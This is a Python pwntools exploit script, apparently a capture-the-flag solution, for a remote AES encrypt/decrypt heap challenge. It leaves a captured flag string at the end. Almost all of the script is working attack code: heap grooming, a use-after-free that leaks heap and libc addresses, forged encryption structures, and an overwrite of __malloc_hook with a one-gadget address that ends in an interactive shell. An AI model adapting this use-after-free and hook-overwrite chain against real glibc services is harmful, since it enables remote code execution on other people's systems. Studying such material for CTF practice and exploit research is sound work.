from pwn import *
import sys
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
DEBUG = 0
if DEBUG:
     p = process('./task')
     e = ELF('./task')
     #scontext.log_level = 'debug'
     #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')b0verfl0w
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
     #p = process(['./reader'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc-2.19.so')})
     #libc = ELF('./libc64.so')
     
     
else:
     p = remote('111.186.63.201', 10001)
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
     #libc = ELF('libc_64.so.6')

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        print "program_base",hex(moduleBase)
        gdb.attach(p, "set follow-fork-mode child\nb *" + hex(moduleBase+addr))

class prpcrypt():
    def __init__(self, key,iv):
        self.key = key
        self.mode = AES.MODE_CBC
        self.iv = iv
     
    
    def encrypt(self, text):
        cryptor = AES.new(self.key, self.mode, self.iv)
        length = 32
        count = len(text)
	if(count % length != 0) :
        	add = length - (count % length)
	else:
		add = 0
        text = text + ('\0' * add)
        self.ciphertext = cryptor.encrypt(text)
        return b2a_hex(self.ciphertext)
     
    
    def decrypt(self, text):
        cryptor = AES.new(self.key, self.mode, self.iv)
        plain_text = cryptor.decrypt(a2b_hex(text))
        return plain_text.rstrip('\0')
 

def add(idx=1,way=1,key='1'*0x20,IV='a'*0x10,size=0,data='',go_flag=False):
    if not go_flag:
        p.recvuntil('3. Go')
    p.sendline('1')
    p.recvuntil('id : ')
    p.sendline(str(idx))
    p.recvuntil('(2): ')
    p.sendline(str(way))
    p.recvuntil('Key : ')
    p.send(key)
    p.recvuntil('IV : ')
    p.send(IV)
    p.recvuntil('Size : ')
    p.sendline(str(size))
    p.recvuntil('Data : ')
    p.send(data)

def delete(idx,go_flag=False):
    if not go_flag:
        p.recvuntil('3. Go')
    p.sendline('2')
    p.recvuntil('id : ')
    p.sendline(str(idx))
def delete1(idx):
    #p.recvuntil('3. Go')
    p.sendline('2')
    p.recvuntil('id : ')
    p.sendline(str(idx))
def go(idx):
    p.recvuntil('3. Go')
    p.sendline('3')
    p.recvuntil('id : ')
    p.sendline(str(idx))

def pwn():
    pc = prpcrypt('1'*0x20,'a'*0x10) #aes algrithom
    #
    add(9999,1,size=0x10,data='a'*0x10) #use to get shell.
    add(999,1,size=0x10,data='a'*0x10)  #enc_struct to build fake enc
    #debug(0x1253)
    add(99,2,size=0x10,data='a'*0x10)   #dec_struct to build fake dec

    ## step 1 leak heap address
    add(0,1,size=0x70,data='a'*0x70)
    add(1,1,size=0x20,data='a'*0x20)
    add(2,1,size=0x70,data='a'*0x70)
   
    
    delete(0)
    go(1)
    delete(1,True)
    delete(2)
    add(4,1,size=0x20,data='a'*0x20)
    add(5,1,size=0x20,data='a'*0x20)   # 1 chunk's enc_struct must be malloced out,after this operation, there are still 3 chunks with size of 0x80 and 1 chunk with size 0xb0, i don't know somehow there is one more chunk with size 0x110, maybe for aes algorithm

    ### leak
    p.recvuntil('text: \n')
    
    data=p.recvuntil('\n')
    data=data.replace(" ",'').strip()
    #print data
         
    d = pc.decrypt(data)                     
    heap_addr=u64(d[:8])
    #print hex(heap_addr)
    heap_base=heap_addr-0x1be0
    enc_struct_addr=heap_base+0x1300
    dec_struct_addr=heap_base+0x17c0
    print "heap_base",hex(heap_base)
    
    ### do some thing clean the tcache list
    add(6,1,size=0x70,data='a'*0x70,go_flag=True)
    add(7,1,size=0x70,data='a'*0x70)

    ## step 2 uaf to leak libc address.

    ### first free chunk to unsorted bin chunk to get libc address.
    for i in range(0,7):
        add(100+i,1,size=0x80,data='a'*0x80)
    #debug(0x1253)
    add(200,1,size=0x80,data='a'*0x80) # which chunk of content use to leak libc address
    
    leak_libc_heap=heap_base+0x3b10
    add(201,1,size=0x30,data='a'*0x30) # 
    for i in range(0,7):
        delete(100+i)
    
    ### malloc out one chunk with size of 0x80
    add(201,1,size=0x70,data='a'*0x70)
    
    ### go with 200 and free 200 and 201 and add one which will build a fake struct(uaf in 200)
    #debug(0x15c6)
    go(200)
    p.recvuntil('Prepare...')
    #debug(0x14f3)
    delete(200,True)
    delete(201)
    
    fake_enc=p64(leak_libc_heap)+p64(0x10)+p32(1)+'1'*0x20+'a'*0x10+p32(0)+p64(0)+p64(0)+p64(enc_struct_addr)+p64(0xb)+p64(0)
    add(203,1,size=0x70,data=fake_enc)  ## the key to leak libc
    
    p.recvuntil('text: \n')
    
    data=p.recvuntil('\n')
    data=data.replace(" ",'').strip()
    print data
         
    d = pc.decrypt(data)                     
    libc_addr=u64(d[:8])
    #print hex(libc_addr)
    libc_base=libc_addr-0x3ebca0
    print "libc_base",hex(libc_base)
    rce=libc_base+0x10a38c 
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    ## step uaf to write a fastbin chunk
    
    ### do some thing to clean the tcache
    add(100+0,1,size=0x80,data='a'*0x80,go_flag=True)
    for i in range(1,7):
        add(100+i,1,size=0x80,data='a'*0x80)
    
    payload=p64(malloc_hook)*4
    payload=pc.encrypt(payload)
    payload=payload.decode('hex')
    
    #debug(0x12f5)
    payload_addr=heap_base+0x4180
    add(1000,1,size=0x1000,data=payload*(0x1000/len(payload)))
    add(300,1,size=0x30,data='a'*0x30)
    add(301,1,size=0x70,data='a'*0x70)
    #debug(0x14f3)
    delete(9999)  # free the evil
    evil_addr=heap_base+0x14c0
    global_ptr=evil_addr-0x1260
    #debug(0x15c6)
    go(300)
    delete(300,go_flag=True)
    delete(301)
    add(400,1,size=0x30,data='a'*0x30)
    fake_dec=p64(payload_addr-0x30)+p64(0x1000+0x30)+p32(1)+'1'*0x20+'a'*0x10+p32(0)+p64(0)+p64(0)+p64(dec_struct_addr)+p64(0xb)+p64(0)
    add(401,1,size=0x70,data=fake_dec)  ## the key to overwrite the fastbin chunk
    data=p64(rce)*(0x70/8)
    
    sleep(2)
    #debug(0x12f5)
    #haha ,overwrite the malloc_hook to rce
    add(500,1,size=0x70,data=data)
    
    #trigger malloc
    p.recvuntil('3. Go')
    p.sendline('1')
    p.recvuntil('id : ')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline('1')
    
    p.interactive()
    

if __name__ == '__main__':
   pwn()
#flag{pl4y_w1th_u4F_ev3ryDay_63a9d2a26f275685665dc02b886b530e}
